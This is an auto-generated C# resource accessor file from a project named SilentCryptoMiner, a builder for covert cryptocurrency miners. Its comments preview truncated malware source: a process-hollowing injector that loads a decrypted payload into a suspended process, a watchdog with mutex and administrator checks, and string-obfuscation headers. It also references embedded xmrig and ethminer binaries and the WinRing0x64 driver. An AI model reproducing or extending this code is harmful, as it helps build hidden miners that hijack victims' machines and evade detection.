﻿//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace SilentCryptoMiner.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    public class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        public static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("SilentCryptoMiner.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        public static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.IO;
        ///using System.IO.Compression;
        ///using System.Reflection;
        ///using System.Security.Principal;
        ///using System.Security.Cryptography;
        ///using System.Runtime.InteropServices;
        ///using System.Text;
        ///using System.Resources;
        ///using System.Threading;
        ///using System.Diagnostics;
        ///using Microsoft.Win32;
        ///using System.Collections.Generic;
        ///using System.Management;
        ///using System.Linq;
        ///
        ///public partial class Checker
        ///{
        ///    private static void Main()
        ///    {
        ///        try
        ///        {
        ///#if DefWatchd [rest of string was truncated]&quot;;.
        /// </summary>
        public static string Checker {
            get {
                return ResourceManager.GetString("Checker", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;common.h&quot;
        ///
        ///#include &quot;ntddk.h&quot;
        ///#include &quot;obfuscateu.h&quot;
        ///
        ///UNICODE_STRING init_unicode_string(wchar_t* source_string) {
        ///    UNICODE_STRING result = { 0 };
        ///    result.MaximumLength = (USHORT)(wcslen(source_string) * AYU_OBFC(sizeof(WCHAR)) + AYU_OBFC(sizeof(WCHAR)));
        ///    result.Length = result.MaximumLength - AYU_OBFC(sizeof(WCHAR));
        ///    result.Buffer = source_string;
        ///    return result;
        ///}
        ///
        ///#define INITIALIZE_NT_OBJECT_ATTRIBUTES(path) \
        ///    wchar_t ntPath[MAX_PATH + 4] = { 0 }; \
        ///    com [rest of string was truncated]&quot;;.
        /// </summary>
        public static string common_cpp {
            get {
                return ResourceManager.GetString("common.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ///#include &quot;ntddk.h&quot;
        ///
        ///UNICODE_STRING init_unicode_string(wchar_t* source_string);
        ///
        ///PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, DWORD threadFlags);
        ///
        ///bool has_gpu();
        ///
        ///void run_program(bool wait, wchar_t* startDir, wchar_t* programPath, wchar_t* cmdLine, ...);
        ///
        ///unsigned char* resource_decrypt(unsigned char* data, size_t in_len, size_t* out_len);
        ///
        ///void resource_free(void* ptr, size_t size); [rest of string was truncated]&quot;;.
        /// </summary>
        public static string common_h {
            get {
                return ResourceManager.GetString("common.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] Compilers {
            get {
                object obj = ResourceManager.GetObject("Compilers", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
        /// </summary>
        public static System.Drawing.Icon Ethereum {
            get {
                object obj = ResourceManager.GetObject("Ethereum", resourceCulture);
                return ((System.Drawing.Icon)(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Drawing.Bitmap.
        /// </summary>
        public static System.Drawing.Bitmap Ethereum1 {
            get {
                object obj = ResourceManager.GetObject("Ethereum1", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] ethminer {
            get {
                object obj = ResourceManager.GetObject("ethminer", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
        /// </summary>
        public static System.Drawing.Icon icon {
            get {
                object obj = ResourceManager.GetObject("icon", resourceCulture);
                return ((System.Drawing.Icon)(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Drawing.Bitmap.
        /// </summary>
        public static System.Drawing.Bitmap icon1 {
            get {
                object obj = ResourceManager.GetObject("icon1", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;inject.h&quot;
        ///
        ///#include &quot;ntddk.h&quot;
        ///#include &quot;common.h&quot;
        ///#include &quot;obfuscateu.h&quot;
        ///
        ///#define CHECK_STATUS_AND_CLEANUP(status) { if(!NT_SUCCESS(status)) { UtTerminateProcess(pi.hProcess, 0); return INVALID_HANDLE_VALUE; } }
        ///
        ///HANDLE process_hollowing(wchar_t* programPath, wchar_t* cmdLine, wchar_t* runtimeData, BYTE* payloadBuf, wchar_t* startDir)
        ///{
        ///    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLine, startDir, runtimeData, 0, AYU_OBFC(THREAD_CREATE_FLAGS_CREATE_SUSPENDED));
        ///    if ( [rest of string was truncated]&quot;;.
        /// </summary>
        public static string inject_cpp {
            get {
                return ResourceManager.GetString("inject.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ///#include &lt;windows.h&gt;
        ///
        ///HANDLE process_hollowing(wchar_t* programPath, wchar_t* cmdLine, wchar_t* runtimeData, BYTE* payloadBuf, wchar_t* startDir);.
        /// </summary>
        public static string inject_h {
            get {
                return ResourceManager.GetString("inject.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] Install {
            get {
                object obj = ResourceManager.GetObject("Install", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
        ///&lt;Localization&gt;
        ///  &lt;Control Name=&quot;tabMain&quot;&gt;
        ///    &lt;Text Lang=&quot;en&quot;&gt;Main&lt;/Text&gt;
        ///    &lt;Text Lang=&quot;sv&quot;&gt;Main&lt;/Text&gt;
        ///    &lt;Text Lang=&quot;pl&quot;&gt;Główne&lt;/Text&gt;
        ///    &lt;Text Lang=&quot;es&quot;&gt;Principal&lt;/Text&gt;
        ///    &lt;Text Lang=&quot;ru&quot;&gt;Основное&lt;/Text&gt;
        ///    &lt;Text Lang=&quot;ptbr&quot;&gt;Principal&lt;/Text&gt;
        ///  &lt;/Control&gt;
        ///  &lt;Control Name=&quot;tabStartup&quot;&gt;
        ///    &lt;Text Lang=&quot;en&quot;&gt;Startup&lt;/Text&gt;
        ///    &lt;Text Lang=&quot;sv&quot;&gt;Uppstart&lt;/Text&gt;
        ///    &lt;Text Lang=&quot;pl&quot;&gt;Start&lt;/Text&gt;
        ///    &lt;Text Lang=&quot;es&quot;&gt;Inicio&lt;/Text&gt;
        ///    &lt;Text Lang=&quot;ru&quot;&gt;Автозапуск&lt;/Text&gt;
        ///   [rest of string was truncated]&quot;;.
        /// </summary>
        public static string LocalizedControls {
            get {
                return ResourceManager.GetString("LocalizedControls", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Drawing.Bitmap.
        /// </summary>
        public static System.Drawing.Bitmap microsoft_admin {
            get {
                object obj = ResourceManager.GetObject("microsoft_admin", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;ntddk.h&quot;
        ///
        ///#include &quot;common.h&quot;
        ///#include &quot;obfuscateu.h&quot;
        ///#include &quot;inject.h&quot;
        ///
        ///void inject_process(wchar_t* mutex, BYTE* payload, size_t payloadSize, wchar_t* programPath, wchar_t* cmdLine, wchar_t* startDir, wchar_t* runtimeData, bool setCritical) {
        ///    if (!check_mutex(mutex)) {
        ///        size_t out_len;
        ///        unsigned char* payloadDecryped = resource_decrypt(payload, payloadSize, &amp;out_len);
        ///        HANDLE pHandle = process_hollowing(programPath, cmdLine, runtimeData, payloadDecryped, star [rest of string was truncated]&quot;;.
        /// </summary>
        public static string miner {
            get {
                return ResourceManager.GetString("miner", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
        /// </summary>
        public static System.Drawing.Icon Monero {
            get {
                object obj = ResourceManager.GetObject("Monero", resourceCulture);
                return ((System.Drawing.Icon)(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Drawing.Bitmap.
        /// </summary>
        public static System.Drawing.Bitmap Monero1 {
            get {
                object obj = ResourceManager.GetObject("Monero1", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ///#include &lt;windows.h&gt;
        ///#include &quot;Syscalls\syscalls.h&quot;
        ///
        ///#ifndef NT_SUCCESS
        ///#define NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;= 0)
        ///#endif
        ///
        ///#ifndef STATUS_SUCCESS
        ///#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
        ///#endif
        ///
        ///#ifndef STATUS_UNSUCCESSFUL
        ///#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
        ///#endif
        ///
        ///#ifndef STATUS_NO_MORE_ENTRIES
        ///#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001AL)
        ///#endif 
        ///
        ///#ifndef STATUS_INFO_LENGTH_MISMATCH
        ///#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
        ///#endif
        ///
        ///#ifndef OBJ_C [rest of string was truncated]&quot;;.
        /// </summary>
        public static string ntddk_h {
            get {
                return ResourceManager.GetString("ntddk.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///
        ////* --------------------------------- ABOUT -------------------------------------
        ///
        ///Original Author: Adam Yaxley
        ///Website: https://github.com/adamyaxley
        ///License: See end of file
        ///
        ///Unified Version Author: Unam Sanctam
        ///Website: https://github.com/UnamSanctam
        ///License: See end of file
        ///
        ///Current unified version is stripped of some functions that the original version has but those can be re-added easily if wanted.
        ///
        ///----------------------------------------------------------------------------- */
        ///
        ///#ifndef  [rest of string was truncated]&quot;;.
        /// </summary>
        public static string obfuscateu_h {
            get {
                return ResourceManager.GetString("obfuscateu.h", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #ifdef DefIcon
        ///1 ICON &quot;#ICON&quot;
        ///#endif
        ///#ifdef DefAssembly
        ///1 VERSIONINFO
        ///FILEVERSION     #VERSION
        ///PRODUCTVERSION  #VERSION
        ///BEGIN
        ///    BLOCK &quot;StringFileInfo&quot;
        ///    BEGIN
        ///        BLOCK &quot;040904E4&quot;
        ///        BEGIN
        ///            VALUE &quot;CompanyName&quot;, &quot;#COMPANY&quot;
        ///			VALUE &quot;FileTitle&quot;, &quot;#TITLE&quot;
        ///            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
        ///            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
        ///            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
        ///			VALUE &quot;LegalTrademark&quot;, &quot;#TRADEMARK&quot;
        ///            VALUE &quot;ProductName&quot;, [rest of string was truncated]&quot;;.
        /// </summary>
        public static string resource {
            get {
                return ResourceManager.GetString("resource", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
        ///&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;
        ///  &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
        ///    &lt;security&gt;
        ///      &lt;requestedPrivileges&gt;
        ///        &lt;requestedExecutionLevel level=&quot;#MANIFESTLEVEL&quot; uiAccess=&quot;false&quot;&gt;&lt;/requestedExecutionLevel&gt;
        ///      &lt;/requestedPrivileges&gt;
        ///    &lt;/security&gt;
        ///  &lt;/trustInfo&gt;
        ///&lt;/assembly&gt;.
        /// </summary>
        public static string template {
            get {
                return ResourceManager.GetString("template", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] Uninstall {
            get {
                object obj = ResourceManager.GetObject("Uninstall", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.IO;
        ///using System.IO.Compression;
        ///using System.Reflection;
        ///using System.Security.Principal;
        ///using System.Security.Cryptography;
        ///using System.Runtime.InteropServices;
        ///using System.Runtime.ExceptionServices;
        ///using System.Text;
        ///using System.Resources;
        ///using System.Threading;
        ///using System.Diagnostics;
        ///using Microsoft.Win32;
        ///using System.Collections.Generic;
        ///using System.Management;
        ///using System.Linq;
        ///
        ///public partial class _rUninstaller_
        ///{
        ///    private static void Main [rest of string was truncated]&quot;;.
        /// </summary>
        public static string Uninstaller {
            get {
                return ResourceManager.GetString("Uninstaller", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #include &quot;ntddk.h&quot;
        ///
        ///#include &quot;common.h&quot;
        ///#include &quot;obfuscateu.h&quot;
        ///
        ///int main(int argc, char *argv[])
        ///{
        ///    UNICODE_STRING ustring = init_unicode_string(AYU_OBFW(L&quot;\\BaseNamedObjects\\#WATCHDOGID&quot;));
        ///    OBJECT_ATTRIBUTES attr = { 0 };
        ///    InitializeObjectAttributes(&amp;attr, &amp;ustring, 0, NULL, NULL);
        ///
        ///    HANDLE hMutex;
        ///    if (!NT_SUCCESS(UtCreateMutant(&amp;hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &amp;attr, TRUE))) {
        ///        return 0;
        ///    }
        ///
        ///    bool isAdmin = check_administrator();
        ///
        ///    PUT_PEB_EXT peb  [rest of string was truncated]&quot;;.
        /// </summary>
        public static string watchdog {
            get {
                return ResourceManager.GetString("watchdog", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] WinRing0x64 {
            get {
                object obj = ResourceManager.GetObject("WinRing0x64", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        public static byte[] xmrig {
            get {
                object obj = ResourceManager.GetObject("xmrig", resourceCulture);
                return ((byte[])(obj));
            }
        }
    }
}
